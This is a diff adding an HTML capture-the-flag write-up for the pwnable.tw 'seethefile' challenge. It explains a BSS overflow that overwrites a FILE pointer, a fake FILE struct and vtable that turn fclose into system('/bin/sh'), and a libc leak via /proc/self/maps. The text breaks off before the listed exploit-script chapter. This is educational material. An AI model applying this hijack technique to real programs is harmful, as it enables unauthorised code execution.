@@ -1,0 +1,1444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>seethefile | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F441;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 680px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+.tag-fsop { background: rgba(251, 146, 60, 0.15); color: var(--orange); border: 1px solid rgba(251, 146, 60, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+.mem-orange { color: var(--orange); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">seethefile</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>seethefile</h1>
+  <p class="hero-subtitle">"Can you see anything? Get a shell for me." &mdash; Exploiting a BSS buffer overflow to hijack a FILE pointer, then leveraging File-Stream Oriented Programming (FSOP) to redirect a vtable call into <code class="inline">system("/bin/sh")</code>.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">250 pts</span>
+    <span class="hero-tag tag-arch">i386 (32-bit ELF)</span>
+    <span class="hero-tag tag-vuln">BSS Buffer Overflow</span>
+    <span class="hero-tag tag-fsop">FSOP</span>
+    <span class="hero-tag tag-nx">NX Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10200</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">seethefile (32-bit ELF, i386)</td></tr>
+        <tr><td class="label">Points</td><td class="value">250</td></tr>
+        <tr><td class="label">Description</td><td class="value">"Can you see anything? Get a shell for me."</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec seethefile
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Partial RELRO</td><td class="partial">GOT is writable &mdash; potential GOT overwrite target</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated on the stack</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode injection &mdash; must redirect execution via existing code</td></tr>
+        <tr><td class="label">No PIE</td><td class="off">Binary addresses are fixed &mdash; known BSS/GOT/PLT addresses</td></tr>
+      </table>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./seethefile
+----------------------
+  1. Open
+  2. Read
+  3. Write
+  4. Close
+  5. Exit
+----------------------
+Your choice :1
+Filename :/etc/passwd
+----------------------
+  1. Open
+  2. Read
+  3. Write
+  4. Close
+  5. Exit
+----------------------
+Your choice :2
+----------------------
+  1. Open
+  3. Write
+  4. Close
+  5. Exit
+----------------------
+Your choice :3
+root:x:0:0:root:/root:/bin/bash
+...</code></pre>
+      </div>
+
+      <p>The binary presents a simple file viewer: open a file, read its contents, write (display) them, and close the file. It blocks filenames containing "flag", but the real vulnerability lies in the exit path.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Decompiled Code</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">// BSS variables
+char name[0x20];      // 0x804b260 - name buffer
+FILE *fp;             // 0x804b28c - global FILE pointer
+char filename[0x40];  // input buffer for filenames
+char filebuf[0x190];  // buffer for fread
+
+int main() {
+    do {
+        menu();
+        scanf(" %s", input_str);
+        input = atoi(input_str);
+        switch(input) {
+            case 1: openfile(); break;
+            case 2: readfile(); break;
+            case 3: writefile(); break;
+            case 4: closefile(); break;
+            case 5:
+                printf("Leave your name :");
+                scanf(" %s", name);   // BUFFER OVERFLOW - no width limit!
+                printf("Thank you %s,see you next time\n", name);
+                if(fp != NULL) fclose(fp);  // Triggers vtable call!
+                exit(0);
+        }
+    } while(1);
+}
+
+void openfile() {
+    scanf("%63s", filename);
+    if(strstr(filename, "flag") != NULL) {
+        puts("Danger!");
+        exit(0);
+    }
+    fp = fopen(filename, "r");
+}
+
+void readfile() {
+    fread(filebuf, 399, 1, fp);
+}
+
+void writefile() {
+    // prints filebuf contents if no FLAG or '}' substring
+}
+
+void closefile() {
+    fclose(fp);
+    fp = NULL;
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: BSS Buffer Overflow into FILE Pointer</div>
+        In option 5, <code class="inline">scanf(" %s", name)</code> reads input with <strong>no width limit</strong>. The <code class="inline">name</code> buffer at <code class="inline">0x804b260</code> is only 0x20 (32) bytes, but the global <code class="inline">fp</code> pointer lives at <code class="inline">0x804b28c</code> &mdash; just 44 bytes after <code class="inline">name</code>. We can overflow <code class="inline">name</code> and overwrite <code class="inline">fp</code> with an arbitrary address. After the overflow, <code class="inline">fclose(fp)</code> is called on our controlled pointer, which follows the vtable inside the FILE struct to call virtual functions &mdash; giving us code execution!
+      </div>
+
+      <h3>BSS Memory Layout</h3>
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">0x804b260</span><span class="mem-arrow">|</span><span class="mem-data">name[0x20]</span><span class="mem-desc">&larr; 32-byte name buffer (overflow starts here)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x804b280</span><span class="mem-arrow">|</span><span class="mem-data">[other BSS vars]</span><span class="mem-desc">&larr; gap between name and fp</span></div>
+        <div class="mem-row"><span class="mem-addr">0x804b28c</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">fp (FILE*)</span><span class="mem-desc">&larr; Global FILE pointer (OVERWRITE TARGET)</span></div>
+        <div style="height:8px"></div>
+        <div class="mem-row"><span class="mem-desc">Offset from name to fp: <span class="mem-highlight">0x2c = 44 bytes</span></span></div>
+      </div>
+
+      <h3>Understanding _IO_FILE_plus (glibc FILE struct)</h3>
+      <p>In glibc, <code class="inline">FILE</code> is actually <code class="inline">_IO_FILE_plus</code>, which consists of the <code class="inline">_IO_FILE</code> struct followed by a <strong>vtable pointer</strong>. This vtable contains function pointers for all FILE operations. When <code class="inline">fclose()</code> is called, it eventually calls <code class="inline">fp-&gt;vtable-&gt;__close(fp)</code>.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">struct _IO_FILE_plus {
+    struct _IO_FILE file;     // The actual FILE struct (0x94 bytes in 32-bit)
+    const struct _IO_jump_t *vtable;  // +0x94: vtable pointer!
+};
+
+struct _IO_FILE {
+    int _flags;           // +0x00: flags (first 4 bytes of the struct)
+    char *_IO_read_ptr;   // +0x04
+    char *_IO_read_end;   // +0x08
+    char *_IO_read_base;  // +0x0c
+    char *_IO_write_base; // +0x10
+    char *_IO_write_ptr;  // +0x14
+    char *_IO_write_end;  // +0x18
+    char *_IO_buf_base;   // +0x1c
+    char *_IO_buf_end;    // +0x20
+    // ... more fields ...
+    int _fileno;          // +0x38
+    // ... more fields ...
+    // Total size: 0x94 bytes
+};
+
+// vtable is at offset +0x94 from the start of the struct
+// __close is at vtable + 19*4 = vtable + 0x4c
+struct _IO_jump_t {
+    // ... 18 entries before __close ...
+    void *__close;        // offset 19 * 4 = 0x4c from vtable start
+    // ...
+};</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Insight: FSOP (File-Stream Oriented Programming)</div>
+        The attack chain is:<br>
+        &bull; <code class="inline">fclose(fp)</code> calls <code class="inline">_IO_file_close_it(fp)</code>, which dereferences <code class="inline">fp-&gt;vtable</code> and calls <code class="inline">fp-&gt;vtable-&gt;__close(fp)</code><br>
+        &bull; If we control <code class="inline">fp</code> (via the overflow), we can make it point to a <strong>fake FILE struct</strong> we place in BSS<br>
+        &bull; In the fake FILE struct, we set <code class="inline">vtable</code> to point to a <strong>fake vtable</strong> also in BSS<br>
+        &bull; In the fake vtable, we set <code class="inline">__close</code> to <code class="inline">system</code><br>
+        &bull; The FILE struct's <code class="inline">_flags</code> field (offset 0) becomes the argument to <code class="inline">__close</code> &mdash; so we put <code class="inline">"/bin/sh\x00"</code> there!<br>
+        &bull; Result: <code class="inline">system("/bin/sh")</code> &rarr; <span class="mem-green">SHELL!</span>
+      </div>
+
+      <h3>The "flag" Filter Bypass</h3>
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Cannot Directly Read the Flag</div>
+        The <code class="inline">openfile()</code> function checks <code class="inline">strstr(filename, "flag")</code> and exits if found. This blocks us from directly opening <code class="inline">/home/seethefile/flag</code>. However, we don't need to read the flag file directly &mdash; we just need to <strong>leak libc</strong> (via <code class="inline">/proc/self/maps</code>) and then get a shell.
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Verifying BSS Offsets</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ p &name
+$1 = 0x804b260
+gdb-peda$ p &fp
+$2 = 0x804b28c
+gdb-peda$ p/x 0x804b28c - 0x804b260
+$3 = 0x2c
+# Offset from name to fp is 0x2c (44) bytes</code></pre>
+      </div>
+
+      <h3>Leaking Libc via /proc/self/maps</h3>
+      <p>Before we can craft the fake FILE struct, we need to know the libc base address. We can leak it by opening <code class="inline">/proc/self/maps</code>:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # In the program: open("/proc/self/maps"), read, write
+# Output shows memory mappings:
+56555000-56556000 r--p 00000000 00:2340  /home/seethefile/seethefile
+56556000-56557000 r-xp 00001000 00:2340  /home/seethefile/seethefile
+...
+f7e14000-f7fb6000 r-xp 00000000 00:2340  /lib/i386-linux-gnu/libc-2.23.so
+f7fb6000-f7fb8000 r--p 001a2000 00:2340  /lib/i386-linux-gnu/libc-2.23.so
+...
+
+# Parse the libc base from the first libc line:
+# f7e14000 -> libc base address!</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Double Read for /proc/self/maps</div>
+        The <code class="inline">/proc/self/maps</code> file is a virtual file. The first <code class="inline">fread</code> reads from offset 0, but the file position advances. Since the file can be larger than our 399-byte buffer, we need to <strong>call readfile() twice</strong> (calling <code class="inline">fread</code> again advances the position) before calling <code class="inline">writefile()</code> to display the later portions of the file where libc mappings appear. Alternatively, the first read may already contain the libc mapping if ASLR places it early.
+      </div>
